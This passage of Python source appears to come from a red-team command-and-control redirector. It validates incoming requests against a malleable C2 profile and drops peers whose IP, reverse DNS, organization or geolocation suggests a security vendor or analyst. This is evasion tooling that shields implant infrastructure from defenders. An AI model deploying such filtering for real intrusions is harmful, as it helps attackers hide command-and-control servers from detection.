                    self.drop_reason('[{}: DROP, reason:4a] peer\'s IP address is blacklisted: ({}{})'.format(
                        peerIP, cidr, comment
                    ))
                    return True

        if self.proxyOptions['verify_peer_ip_details']:
            ipLookupDetails = None
            try:
                ipLookupDetails = self.ipLookupHelper.lookup(peerIP)

                if ipLookupDetails and len(ipLookupDetails) > 0:
                    if 'organization' in ipLookupDetails.keys():
                        for orgWord in ipLookupDetails['organization']:
                            for word in orgWord.split(' '):
                                if word.lower() in BANNED_AGENTS:
                                    self.drop_reason('[{}: DROP, reason:4c] peer\'s IP lookup organization field ({}) contained banned word: "{}"'.format(peerIP, orgWord, word))
                                    return True

            except Exception as e:
                self.logger.err(f'IP Lookup failed for some reason on IP ({peerIP}): {e}')

            try:
                if not self.ipGeolocationDeterminer.determine(ipLookupDetails):
                    self.drop_reason('[{}: DROP, reason:4d] peer\'s IP geolocation ("{}", "{}", "{}", "{}", "{}") DID NOT met expected conditions'.format(
                        peerIP, ipLookupDetails['continent'], ipLookupDetails['continent_code'], ipLookupDetails['country'], ipLookupDetails['country_code'], ipLookupDetails['city'], ipLookupDetails['timezone']
                    ))
                    return True

            except Exception as e:
                self.logger.err(f'IP Geolocation determinant failed for some reason on IP ({peerIP}): {e}')

        # Reverse-IP lookup check
        try:
            resolved = socket.gethostbyaddr(req.client_address[0])[0]
            for part in resolved.split('.')[:-1]:
                if part.lower() in BANNED_AGENTS:
                    self.drop_reason('[{}: DROP, reason:4b] peer\'s reverse-IP lookup contained banned word: "{}"'.format(peerIP, part))
                    return True

        except Exception as e:
            pass

        fetched_uri = ''
        fetched_host = req.headers['Host']

        for section in ['http-stager', 'http-get', 'http-post']:
            found = False
            for uri in ['uri', 'uri_x86', 'uri_x64']:
                if uri in self.malleable.config[section].keys():
                    _uri = self.malleable.config[section][uri]
                    if _uri in req.path: 
                        found = True

                        if 'client' in self.malleable.config[section].keys():
                            if 'header' in self.malleable.config[section]['client'].keys():
                                for header in self.malleable.config[section]['client']['header']:
                                    k, v = header
                                    if k.lower() == 'host':
                                        fetched_host = v
                                        break
                        break

            if found:
                if self._client_request_inspect(section, req, req_body): 
                    return True

                if self.is_request:
                    variant = self.malleable.config[section]['variant']
                    self.logger.info('== Valid malleable {} (variant: {}) request inbound.'.format(section, variant))
                break

        self.logger.info('[{}: ALLOW] Peer\'s request is accepted'.format(peerIP), color='green')
        return False

    def _client_request_inspect(self, section, req, req_body):
        uri = req.path
        peerIP = req.client_address[0]

        if section in self.malleable.config.keys():
            uris = []
            if 'uri_x86' in self.malleable.config[section].keys(): 
                uris.append(self.malleable.config[section]['uri_x86'])
            if 'uri_x64' in self.malleable.config[section].keys(): 
                uris.append(self.malleable.config[section]['uri_x64'])
            if 'uri' in self.malleable.config[section].keys(): 
                uris.append(self.malleable.config[section]['uri'])

            found = False
            exactmatch = True
            variant = self.malleable.config[section]['variant']

            foundblocks = []
            blocks = ('metadata', 'id', 'output')

            for _block in blocks:
                if 'client' not in self.malleable.config[section].keys():
                    continue

                if _block not in self.malleable.config[section]['client'].keys(): 
                    #self.logger.dbg('No block {} in [{}]'.format(_block, str(self.malleable.config[section]['client'].keys())))
                    continue

                foundblocks.append(_block)
                if 'uri-append' in self.malleable.config[section]['client'][_block].keys() or \
                    'parameter' in self.malleable.config[section]['client'][_block].keys():
                    exactmatch = False

            for _uri in uris:
                if exactmatch == True and uri == _uri: 
                    found = True
                    break
                elif exactmatch == False:
                    if uri.startswith(_uri): 
                        found = True
                        break

            if not found:
                self.logger.dbg('URI not resembles any of the support by malleable profile ones.')
                return True

            self.logger.dbg('Inbound {} (variant: {}) alike request. Validating it...'.format(section, variant))

            for header in self.malleable.config[section]['client']['header']:
                k, v = header

                if k.lower() not in [k2.lower() for k2 in req.headers.keys()]:
                    self.drop_reason('[{}: DROP, reason:5] HTTP request did not contain expected header: "{}"'.format(peerIP, k))
                    return True

                if v not in [v2 for v2 in req.headers.values()]:
                    self.drop_reason('[{}: DROP, reason:6] HTTP request did not contain expected header value: "{}: {}"'.format(peerIP, k, v))
                    return True

            for _block in foundblocks:
                if _block in self.malleable.config[section]['client'].keys():
                    metadata = self.malleable.config[section]['client'][_block]

                    metadatacontainer = ''

                    if 'header' in metadata.keys():
                        if not metadata['header'] in req.headers.keys():
                            self.drop_reason('[{}: DROP, reason:7] HTTP request did not contain expected {} block header: "{}"'.format(peerIP, _block, metadata['header']))
                            return True

                        if req.headers.keys().count(metadata['header']) == 1:
                            metadatacontainer = req.headers[metadata['header']]
                        else:
                            metadatacontainer = [v for k, v in req.headers.items() if k == metadata['header']]

                    elif 'parameter' in metadata.keys():
                        out = parse_qs(urlsplit(req.path).query)

                        paramname = metadata['parameter']
                        if metadata['parameter'] not in out.keys():
                            self.drop_reason('[{}: DROP, reason:8] HTTP request was expected to contain {} block with parameter in URI: "{}"'.format(peerIP, _block, metadata['parameter']))
                            return True

                        metadatacontainer = [metadata['parameter'], out[metadata['parameter']][0]]

                    self.logger.dbg('Metadata container: {}'.format(metadatacontainer))

                    if 'prepend' in metadata.keys():
                        if type(metadata['prepend']) == list:
                            for p in metadata['prepend']:
                                if p not in metadatacontainer:
                                    self.drop_reason('[{}: DROP, reason:9] Did not found prepend pattern: "{}"'.format(peerIP, p))
                                    return True
                        elif type(metadata['prepend']) == str:
                            if metadata['prepend'] not in metadatacontainer:
                                self.drop_reason('[{}: DROP, reason:9] Did not found prepend pattern: "{}"'.format(peerIP, metadata['prepend']))
                                return True

                    if 'append' in metadata.keys():
                        if type(metadata['append']) == list:
                            for p in metadata['append']:
                                if p not in metadatacontainer:
                                    self.drop_reason('[{}: DROP, reason:10] Did not found append pattern: "{}"'.format(peerIP, p))
                                    return True
                        elif type(metadata['append']) == str:
                            if metadata['append'] not in metadatacontainer:
                                self.drop_reason('[{}: DROP, reason:10] Did not found append pattern: "{}"'.format(peerIP, metadata['append']))
                                return True

        #self.logger.info('[{}: ALLOW] Peer\'s request is accepted'.format(peerIP), color='green')
        return False
